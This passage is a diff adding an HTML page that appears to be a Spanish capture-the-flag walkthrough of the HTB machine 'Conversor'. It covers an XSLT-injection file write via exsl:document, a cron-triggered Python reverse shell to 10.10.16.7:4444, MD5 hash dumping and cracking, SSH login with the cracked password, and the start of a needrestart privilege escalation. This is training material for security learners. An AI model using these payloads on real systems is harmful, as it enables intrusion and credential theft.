+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLT</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">conversor.xml</span> &gt; <span class="arg">conversor.html</span></span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 02 HOSTS ===================== -->
+    <div class="section" id="hosts">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Configurar /etc/hosts</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">AGREGAR ENTRADA EN /etc/hosts</span>
+      </div>
+      <div class="prose">
+        <p>
+          El servidor Apache usa <strong>Virtual Hosting</strong>: sirve diferente contenido
+          según el valor del header HTTP <code style="color:var(--yellow);font-family:var(--font-mono)">Host</code>
+          de cada petición. Si accedemos directamente por IP, Apache no reconoce el sitio y redirige
+          al dominio correcto. Como <span class="hl-red">conversor.htb</span> no existe en DNS
+          público (es un dominio ficticio de HTB), debemos indicarle manualmente a nuestro sistema
+          cómo resolverlo.
+        </p>
+        <p>
+          El archivo <span class="hl">/etc/hosts</span> es el resolver DNS local del sistema operativo —
+          se consulta antes que cualquier servidor DNS externo. Al agregar la línea
+          <code style="color:var(--yellow);font-family:var(--font-mono)">10.129.238.31 conversor.htb</code>,
+          cualquier petición a ese dominio va directamente a la IP de la máquina sin consultar DNS.
+          Requiere <strong>sudo</strong> porque /etc/hosts es un archivo del sistema.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nano /etc/hosts">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">HOSTS</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nano <span class="arg">/etc/hosts</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-yellow"># Agregar esta línea al final del archivo:</span></div>
+        <div><span class="o-green">10.129.238.31</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="o-cyan">conversor.htb</span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// ¿POR QUÉ VIRTUAL HOSTING?</p>
+        <p>
+          Virtual Hosting permite a un servidor alojar <strong>múltiples sitios web</strong> en la misma
+          IP. Apache decide qué sitio mostrar leyendo el header <strong>Host</strong> de cada petición
+          HTTP. Si accedemos por IP, el header Host es la IP y Apache no encuentra coincidencia con
+          "conversor.htb", por eso redirige. Al configurar /etc/hosts, el navegador envía
+          <strong>Host: conversor.htb</strong> y Apache sirve el sitio correcto.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 03 WEB ===================== -->
+    <div class="section" id="web">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Exploración Web · Puerto 80</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">EXPLORAR LA APLICACIÓN — PÁGINA /about</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al acceder a <span class="hl-cyan">http://conversor.htb</span> encontramos una aplicación
+          web llamada <strong>Conversor</strong>: convierte archivos XML en HTML visualmente atractivo
+          utilizando hojas de estilo XSLT. La app requiere registro e inicio de sesión. La página
+          tiene dos inputs: un <strong>XML File</strong> y un <strong>XSLT File</strong>.
+        </p>
+        <p>
+          Navegamos a la página <span class="hl-cyan">/about</span> donde encontramos a los
+          desarrolladores del proyecto. Hay un botón muy interesante:
+          <span class="hl-red">Download Source Code</span>. Esta es una mala práctica de seguridad
+          gravísima: exponer el código fuente de la aplicación a cualquier visitante permite a un
+          atacante auditar la lógica interna y encontrar vulnerabilidades sin necesidad de técnicas
+          de fuzzing o OSINT.
+        </p>
+        <p>
+          Con <span class="hl">curl</span> hacemos una petición GET a /about y filtramos las URLs
+          con <span class="hl-cyan">grep</span> buscando los términos "download", "source" y "href"
+          con el flag <span class="hl-cyan">-i</span> (case insensitive). El pipe
+          <code style="color:var(--yellow);font-family:var(--font-mono)">|</code> redirige la salida
+          estándar de curl como entrada de grep, evitando guardar el HTML en disco.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd='curl http://conversor.htb/about | grep -i "download|source|href"'>
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">CURL</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="arg">http://conversor.htb/about</span> <span class="flag">|</span> grep <span class="flag">-i</span> <span class="arg">"download|source|href"</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>&lt;a class="btn btn-primary" <span class="o-yellow">href="/static/source_code.tar.gz"</span> <span class="o-green">download</span>&gt;</div>
+        <div>&nbsp;&nbsp;🔒 Download Source Code</div>
+        <div>&lt;/a&gt;</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// EXPOSICIÓN DE CÓDIGO FUENTE</p>
+        <p>
+          Encontramos que el código fuente está disponible en
+          <strong>/static/source_code.tar.gz</strong>. Exponer el código fuente de una aplicación
+          web en producción es una vulnerabilidad de <strong>Information Disclosure</strong> crítica:
+          permite al atacante entender la lógica de negocio, encontrar credenciales hardcodeadas,
+          identificar rutas internas, y descubrir cómo se procesan los datos — todo sin disparar
+          ninguna alerta en el servidor.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 04 SOURCE CODE ===================== -->
+    <div class="section" id="sourcecode">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Source Code Analysis</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">DESCARGAR EL CÓDIGO FUENTE</span>
+      </div>
+      <div class="prose">
+        <p>
+          Descargamos el archivo comprimido con <span class="hl">curl</span> usando el flag
+          <span class="hl-cyan">-o</span> para especificar el nombre del archivo de salida.
+          Sin <code style="color:var(--yellow);font-family:var(--font-mono)">-o</code>, curl
+          imprimiría el contenido binario por pantalla sin guardarlo en disco.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="curl -o source_code.tar.gz http://conversor.htb/static/source_code.tar.gz">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DESCARGA</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-o</span> <span class="arg">source_code.tar.gz</span> <span class="arg">http://conversor.htb/static/source_code.tar.gz</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">VERIFICAR E INSPECCIONAR EL CONTENIDO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Verificamos el tipo de archivo con <span class="hl">file</span> y luego lo extraemos con
+          <span class="hl">tar</span>. Los flags de tar: <span class="hl-cyan">-x</span> (extract,
+          extraer), <span class="hl-cyan">-v</span> (verbose, muestra cada archivo extraído),
+          <span class="hl-cyan">-f</span> (file, especifica el archivo a procesar). El resultado
+          nos revela la estructura completa de la aplicación Flask.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="file source_code.tar.gz && tar -xvf source_code.tar.gz">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">TAR</span>
+        <div><span class="prompt">$ </span><span class="cmd">file <span class="arg">source_code.tar.gz</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">tar <span class="flag">-xvf</span> <span class="arg">source_code.tar.gz</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>source_code.tar.gz: POSIX tar archive (GNU)</div>
+        <div>&nbsp;</div>
+        <div><span class="o-cyan">app.py</span></div>
+        <div>app.wsgi</div>
+        <div>install.md</div>
+        <div><span class="o-yellow">instance/</span></div>
+        <div><span class="o-green">instance/users.db</span></div>
+        <div><span class="o-yellow">scripts/</span></div>
+        <div>static/</div>
+        <div>static/nmap.xslt</div>
+        <div>templates/register.html</div>
+        <div>templates/about.html</div>
+        <div>templates/index.html</div>
+        <div>templates/login.html</div>
+        <div>templates/base.html</div>
+        <div>templates/result.html</div>
+        <div><span class="o-yellow">uploads/</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">AUDITAR app.py — ENCONTRAR LA VULNERABILIDAD</span>
+      </div>
+      <div class="prose">
+        <p>
+          El archivo más importante es <span class="hl-cyan">app.py</span>, el corazón de la aplicación
+          Flask. Revisamos cómo procesa los archivos subidos por el usuario. En la ruta
+          <code style="color:var(--yellow);font-family:var(--font-mono)">/convert</code> encontramos
+          el código crítico:
+        </p>
+      </div>
+
+      <div class="code-file">
+        <span class="cf-label">app.py</span>
+        <div><span class="cf-cmt"># El parser XML tiene resolve_entities=False — protección contra XXE</span></div>
+        <div><span class="cf-var">parser</span> = etree.<span class="cf-fn">XMLParser</span>(<span class="cf-kw">resolve_entities</span>=<span class="cf-str">False</span>, <span class="cf-kw">no_network</span>=<span class="cf-str">True</span>, <span class="cf-kw">dtd_validation</span>=<span class="cf-str">False</span>, <span class="cf-kw">load_dtd</span>=<span class="cf-str">False</span>)</div>
+        <div><span class="cf-var">xml_tree</span>  = etree.<span class="cf-fn">parse</span>(xml_path, parser)</div>
+        <div>&nbsp;</div>
+        <div><span class="cf-cmt"># El XSLT se parsea SIN restricciones — aquí está la vulnerabilidad</span></div>
+        <div><span class="cf-var">xslt_tree</span> = etree.<span class="cf-fn">parse</span>(xslt_path)</div>
+        <div><span class="cf-var">transform</span> = etree.<span class="cf-fn">XSLT</span>(xslt_tree)</div>
+        <div><span class="cf-var">result_tree</span> = <span class="cf-fn">transform</span>(xml_tree)</div>
+        <div><span class="cf-var">result_html</span> = <span class="cf-fn">str</span>(result_tree)</div>
+        <div>&nbsp;</div>
+        <div><span class="cf-cmt"># El resultado se guarda en uploads/ con UUID como nombre</span></div>
+        <div><span class="cf-var">file_id</span>   = <span class="cf-fn">str</span>(uuid.<span class="cf-fn">uuid4</span>())</div>
+        <div><span class="cf-var">filename</span>  = <span class="cf-fn">f</span><span class="cf-str">"{file_id}.html"</span></div>
+        <div><span class="cf-var">html_path</span> = os.path.<span class="cf-fn">join</span>(UPLOAD_FOLDER, filename)</div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// VULNERABILIDAD — XSLT INJECTION</p>
+        <p>
+          El XML se parsea con restricciones de seguridad (<strong>resolve_entities=False</strong>,
+          <strong>no_network=True</strong>), bloqueando ataques XXE. Sin embargo, el <strong>XSLT se
+          parsea sin ninguna restricción</strong>: <code>etree.parse(xslt_path)</code> sin argumentos
+          de seguridad. XSLT es un lenguaje de programación completo — la extensión
+          <strong>exsl:document</strong> permite <strong>escribir archivos arbitrarios</strong> en el
+          sistema de archivos del servidor. Un atacante que controla el XSLT puede escribir
+          cualquier contenido en cualquier ruta accesible por el proceso www-data.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">LEER install.md — DESCUBRIR EL CRON JOB</span>
+      </div>
+      <div class="prose">
+        <p>
+          El archivo <span class="hl-cyan">install.md</span> documenta cómo se despliega la aplicación
+          en el servidor. Contiene una línea de crontab que revela algo fundamental para la explotación:
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-yellow"># Extracto de install.md — entrada en /etc/crontab:</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-orange">* * * * *</span>&nbsp; <span class="o-cyan">www-data</span>&nbsp; <span class="o-green">for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// EL CRON JOB — PIEZA CLAVE DE LA CADENA</p>
+        <p>
+          Este cron job ejecuta <strong>cada minuto</strong> (indicado por los cinco asteriscos
+          <code>* * * * *</code>) todos los archivos <strong>.py</strong> que existan en el directorio
+          <code>/var/www/conversor.htb/scripts/</code>, como el usuario <strong>www-data</strong>.
+          La combinación es letal: si podemos escribir un archivo .py en esa ruta (usando la XSLT
+          Injection), el cron lo ejecutará automáticamente en el próximo ciclo — sin necesidad de
+          ninguna interacción del servidor o de un usuario.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 05 XSLT INJECTION ===================== -->
+    <div class="section" id="xslt">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">XSLT Injection · Escritura de Archivo</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">CREAR XSLT DE PRUEBA — PROBE</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de ir directamente a la reverse shell, verificamos que la XSLT Injection funciona
+          usando <span class="hl">exsl:document</span>. Esta función de la extensión EXSLT permite
+          crear y escribir archivos en el sistema de archivos del servidor durante la transformación XSLT.
+        </p>
+        <p>
+          La ruta de escritura elegida para la prueba es
+          <span class="hl-yel">/var/www/conversor.htb/static/probe.txt</span> — está dentro del
+          directorio estático de Apache, lo que significa que podremos descargarlo directamente con
+          curl para confirmar que la escritura funcionó. El contenido es simplemente
+          <code style="color:var(--yellow);font-family:var(--font-mono)">EXSLT_OK</code>.
+        </p>
+        <p>
+          El XML de prueba (<span class="hl-cyan">test.xml</span>) es el documento mínimo válido
+          que XSLT necesita para procesar: una declaración XML y un nodo raíz con cualquier contenido.
+          Sin un XML válido, la aplicación rechazaría la transformación antes de procesar el XSLT.
+        </p>
+      </div>
+
+      <div class="code-file">
+        <span class="cf-label">probe.xslt</span>
+        <div><span class="cf-kw">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></div>
+        <div><span class="cf-fn">&lt;xsl:stylesheet</span> version="1.0"</div>
+        <div>&nbsp;&nbsp;xmlns:xsl="http://www.w3.org/1999/XSL/Transform"</div>
+        <div>&nbsp;&nbsp;<span class="cf-var">xmlns:exsl="http://exslt.org/common"</span></div>
+        <div>&nbsp;&nbsp;<span class="cf-var">extension-element-prefixes="exsl"</span>&gt;</div>
+        <div>&nbsp;&nbsp;&lt;xsl:output method="html" encoding="UTF-8"/&gt;</div>
+        <div>&nbsp;&nbsp;&lt;xsl:template match="/"&gt;</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="cf-var">&lt;exsl:document href="/var/www/conversor.htb/static/probe.txt" method="text"&gt;</span>EXSLT_OK<span class="cf-var">&lt;/exsl:document&gt;</span></div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;&lt;html&gt;&lt;body&gt;&lt;h2&gt;Probe sent&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt;</div>
+        <div>&nbsp;&nbsp;&lt;/xsl:template&gt;</div>
+        <div>&lt;/xsl:stylesheet&gt;</div>
+      </div>
+
+      <div class="code-file">
+        <span class="cf-label">test.xml</span>
+        <div><span class="cf-kw">&lt;?xml version="1.0"?&gt;</span></div>
+        <div>&lt;root&gt;&lt;data&gt;test&lt;/data&gt;&lt;/root&gt;</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">SUBIR ARCHIVOS Y VERIFICAR LA ESCRITURA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Subimos ambos archivos desde la interfaz web de Conversor. Al completarse la transformación,
+          la aplicación devuelve el resultado — pero lo importante no es ese HTML, sino que el XSLT
+          <strong>ya ejecutó el exsl:document</strong> y escribió el archivo probe.txt en el servidor.
+          Verificamos accediendo directamente a la ruta estática con curl:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="curl http://conversor.htb/static/probe.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">VERIFY</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="arg">http://conversor.htb/static/probe.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">EXSLT_OK</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿QUÉ CONFIRMA ESTE RESULTADO?</p>
+        <p>
+          La respuesta <strong>EXSLT_OK</strong> confirma que tenemos <strong>escritura arbitraria
+          de archivos</strong> como el usuario www-data en el sistema de archivos del servidor.
+          Ahora conocemos exactamente qué necesitamos: escribir un script Python de reverse shell
+          en el directorio <code>/var/www/conversor.htb/scripts/</code> para que el cron lo ejecute
+          en el próximo minuto.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 06 REVERSE SHELL ===================== -->
+    <div class="section" id="shell">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Reverse Shell · www-data</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">CREAR shell.xslt — PAYLOAD MALICIOSO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Ahora preparamos el XSLT final con el payload real. Usando el mismo mecanismo
+          <span class="hl-cyan">exsl:document</span>, escribimos un script Python de reverse shell
+          directamente en la ruta que el cron job ejecuta:
+          <span class="hl-yel">/var/www/conversor.htb/scripts/shell.py</span>.
+        </p>
+        <p>
+          El código Python usa el módulo <strong>socket</strong> para crear una conexión TCP saliente
+          hacia nuestra IP y puerto. Luego con <strong>os.dup2</strong> redirige los descriptores de
+          archivo de stdin (0), stdout (1) y stderr (2) al socket — de esta forma toda la entrada y
+          salida del proceso va a través de la conexión de red. Finalmente
+          <code style="color:var(--yellow);font-family:var(--font-mono)">pty.spawn("/bin/bash")</code>
+          lanza una bash interactiva sobre esa conexión. Debes reemplazar la IP
+          <span class="hl-red">10.10.16.7</span> con tu IP de HTB (visible en
+          <code style="color:var(--yellow);font-family:var(--font-mono)">ip a</code> en la interfaz
+          tun0).
+        </p>
+      </div>
+
+      <div class="code-file">
+        <span class="cf-label">shell.xslt</span>
+        <div><span class="cf-kw">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></div>
+        <div><span class="cf-fn">&lt;xsl:stylesheet</span> version="1.0"</div>
+        <div>&nbsp;&nbsp;xmlns:xsl="http://www.w3.org/1999/XSL/Transform"</div>
+        <div>&nbsp;&nbsp;xmlns:exsl="http://exslt.org/common"</div>
+        <div>&nbsp;&nbsp;extension-element-prefixes="exsl"&gt;</div>
+        <div>&nbsp;&nbsp;&lt;xsl:output method="html" encoding="UTF-8"/&gt;</div>
+        <div>&nbsp;&nbsp;&lt;xsl:template match="/"&gt;</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="cf-var">&lt;exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text"&gt;</span></div>
+        <div><span class="cf-kw">import</span> socket,subprocess,os</div>
+        <div><span class="cf-var">s</span>=socket.<span class="cf-fn">socket</span>(socket.AF_INET,socket.SOCK_STREAM)</div>
+        <div>s.<span class="cf-fn">connect</span>((<span class="cf-str">"10.10.16.7"</span>,<span class="cf-str">4444</span>))</div>
+        <div>os.<span class="cf-fn">dup2</span>(s.<span class="cf-fn">fileno</span>(),0)</div>
+        <div>os.<span class="cf-fn">dup2</span>(s.<span class="cf-fn">fileno</span>(),1)</div>
+        <div>os.<span class="cf-fn">dup2</span>(s.<span class="cf-fn">fileno</span>(),2)</div>
+        <div><span class="cf-kw">import</span> pty; pty.<span class="cf-fn">spawn</span>(<span class="cf-str">"/bin/bash"</span>)</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="cf-var">&lt;/exsl:document&gt;</span></div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;&lt;html&gt;&lt;body&gt;&lt;h2&gt;Done&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt;</div>
+        <div>&nbsp;&nbsp;&lt;/xsl:template&gt;</div>
+        <div>&lt;/xsl:stylesheet&gt;</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">LISTENER NETCAT Y ESPERAR EL CRON</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de subir el XSLT malicioso, ponemos en escucha nuestro listener con
+          <span class="hl">netcat</span>. Los flags:
+          <span class="hl-cyan">-l</span> (listen, modo escucha),
+          <span class="hl-cyan">-v</span> (verbose, muestra mensajes de conexión),
+          <span class="hl-cyan">-n</span> (no DNS, no resolver nombres),
+          <span class="hl-cyan">-p 4444</span> (puerto en el que escuchar). Es fundamental
+          que el listener esté activo <strong>antes</strong> de que el cron ejecute el script,
+          ya que si la conexión TCP no tiene destino, el script fallará silenciosamente.
+        </p>
+        <p>
+          Una vez recibida la conexión, obtenemos una shell como
+          <span class="hl-cyan">www-data</span>. La mejoramos con
+          <span class="hl-cyan">python3 -c 'import pty;pty.spawn("/bin/bash")'</span> para obtener
+          una bash interactiva completa con historial, autocompletado y control de trabajos.
+          Luego <span class="hl-cyan">export TERM=xterm</span> configura el tipo de terminal
+          para que comandos como <code>clear</code> funcionen correctamente.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nc -lvnp 4444">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LISTENER</span>
+        <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">4444</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>listening on [any] 4444 ...</div>
+        <div><span class="o-yellow">[subir shell.xslt + test.xml en la web y esperar hasta 60 segundos]</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">connect to [10.10.16.7] from (UNKNOWN) [10.129.238.31] 56842</span></div>
+        <div>&nbsp;</div>
+        <div><span class="o-cyan">whoami</span></div>
+        <div>www-data</div>
+      </div>
+
+      <div class="cmd-block" data-cmd="python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">TTY</span>
+        <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-c</span> <span class="arg">'import pty;pty.spawn("/bin/bash")'</span></span></div>
+        <div><span class="prompt">www-data@conversor:~$ </span><span class="cmd">export <span class="arg">TERM=xterm</span></span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// ¿POR QUÉ MEJORAR LA SHELL?</p>
+        <p>
+          Una shell de netcat básica no tiene TTY (teletypewriter). Sin TTY no funcionan:
+          el historial con las flechas, el autocompletado con Tab, los comandos como <code>su</code>,
+          <code>sudo</code> y editores de texto interactivos. <strong>pty.spawn</strong> crea un
+          pseudo-terminal que simula una terminal real, desbloqueando todas esas funcionalidades.
+          Es un paso fundamental tras obtener cualquier reverse shell.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 07 SQLITE ===================== -->
+    <div class="section" id="db">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">SQLite · Extracción de Hashes</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">14</div>
+        <span class="step-title">LOCALIZAR Y CONSULTAR LA BASE DE DATOS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con shell como <span class="hl-cyan">www-data</span>, enumeramos el directorio de la
+          aplicación. En el directorio <span class="hl-yel">/var/www/conversor.htb/instance/</span>
+          encontramos el archivo <span class="hl-green">users.db</span> — la base de datos SQLite
+          de la aplicación que ya habíamos visto en el código fuente descargado.
+        </p>
+        <p>
+          <span class="hl">sqlite3</span> es el cliente de línea de comandos para bases de datos SQLite.
+          La sintaxis es <code style="color:var(--yellow);font-family:var(--font-mono)">sqlite3 &lt;archivo.db&gt; "consulta SQL"</code>.
+          Con <code style="color:var(--yellow);font-family:var(--font-mono)">SELECT * FROM users</code>
+          recuperamos todos los registros de la tabla de usuarios, incluyendo sus hashes de contraseña.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd /var/www/conversor.htb/instance && sqlite3 users.db 'select * from users;'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLITE</span>
+        <div><span class="prompt">www-data@conversor:~$ </span><span class="cmd">cd <span class="arg">/var/www/conversor.htb/instance</span></span></div>
+        <div><span class="prompt">www-data@conversor:/var/www/conversor.htb/instance$ </span><span class="cmd">sqlite3 <span class="arg">users.db</span> <span class="arg">"select * from users;"</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">1</span>|<span class="o-cyan">fismathack</span>|<span class="o-yellow">5b5c3ac3a1c897c94caad48e6c71fdec</span></div>
+        <div><span class="o-green">5</span>|<span class="o-cyan">test</span>|<span class="o-yellow">cc03e747a6afbbcbf8be7668acfebee5</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">15</div>
+        <span class="step-title">CRACKEAR EL HASH MD5 CON CRACKSTATION</span>
+      </div>
+      <div class="prose">
+        <p>
+          Los hashes obtenidos tienen 32 caracteres hexadecimales — formato característico de
+          <strong>MD5</strong>. MD5 es un algoritmo de hash criptográfico diseñado en 1991,
+          considerado completamente roto para el almacenamiento de contraseñas: es computacionalmente
+          barato, no usa salt por defecto, y existen bases de datos masivas de hashes precomputados.
+        </p>
+        <p>
+          <span class="hl">CrackStation</span> (<span class="hl-cyan">https://crackstation.net</span>)
+          es un servicio online que dispone de bases de datos rainbow tables con miles de millones
+          de pares hash↔password. Introducimos el hash de fismathack:
+          <span class="hl-yel">5b5c3ac3a1c897c94caad48e6c71fdec</span> y obtenemos la contraseña
+          en texto plano en segundos.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-yellow">Hash:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5b5c3ac3a1c897c94caad48e6c71fdec</div>
+        <div><span class="o-yellow">Tipo:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; md5</div>
+        <div><span class="o-green">Resultado:</span>&nbsp; Keepmesafeandwarm</div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USUARIO</div>
+          <div class="cred-val">fismathack</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">CONTRASEÑA</div>
+          <div class="cred-val">Keepmesafeandwarm</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">HASH MD5</div>
+          <div class="cred-val">5b5c3ac3a1c897c94caad48e6c71fdec</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">ORIGEN</div>
+          <div class="cred-val">users.db (SQLite)</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 08 SSH ===================== -->
+    <div class="section" id="ssh">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">SSH como fismathack · User Flag</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">16</div>
+        <span class="step-title">CONECTAR POR SSH Y OBTENER USER FLAG</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con las credenciales crackeadas intentamos acceso SSH directamente a la máquina.
+          Esta técnica se llama <strong>Password Reuse</strong>: la contraseña de la cuenta web
+          también sirve como contraseña del usuario del sistema operativo.
+          SSH (Secure Shell) proporciona una conexión cifrada y una terminal interactiva completa —
+          mucho más estable que una reverse shell de netcat.
+        </p>
+        <p>
+          Tras autenticarnos encontramos el archivo <span class="hl-cyan">user.txt</span> en el
+          home de fismathack con la <strong>User Flag</strong> de la máquina.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh fismathack@10.129.238.31">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH</span>
+        <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">fismathack@10.129.238.31</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>fismathack@10.129.238.31's password: <span class="o-yellow">Keepmesafeandwarm</span></div>
+        <div>&nbsp;</div>
+        <div>Last login: Sun May 31 21:25:44 2026 from 10.10.16.7</div>
+        <div>fismathack@conversor:~$ ls</div>
+        <div><span class="o-cyan">user.txt</span></div>
+        <div>fismathack@conversor:~$ cat user.txt</div>
+        <div><span class="o-green">9741709e16657a97c14cf281bbc33781</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 09 PRIVESC ===================== -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Escalada de Privilegios · needrestart</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">17</div>
+        <span class="step-title">ENUMERAR PERMISOS SUDO</span>
+      </div>
+      <div class="prose">
+        <p>
+          El primer paso en la escalada de privilegios es revisar qué puede ejecutar el usuario
+          actual con privilegios de root. El comando <span class="hl">sudo -l</span> lista todos
+          los comandos que fismathack tiene permiso de ejecutar con sudo, sin necesidad de contraseña
+          si aparece <code style="color:var(--yellow);font-family:var(--font-mono)">NOPASSWD</code>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo -l">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SUDO</span>
+        <div><span class="prompt">fismathack@conversor:~$ </span><span class="cmd">sudo <span class="flag">-l</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Matching Defaults entries for fismathack on conversor:</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;env_reset, mail_badpass, secure_path=..., use_pty</div>
+        <div>&nbsp;</div>
+        <div>User fismathack may run the following commands on conversor:</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;(ALL : ALL) NOPASSWD: <span class="o-red">/usr/sbin/needrestart</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// CVE-2024-48990 — NEEDRESTART PRIVILEGE ESCALATION</p>
+        <p>
+          <strong>needrestart</strong> es una utilidad de Ubuntu/Debian que detecta servicios que
+          necesitan reiniciarse tras actualizar librerías. La versión instalada es vulnerable a
+          <strong>CVE-2024-48990</strong>: needrestart ejecuta el intérprete Perl para procesar su
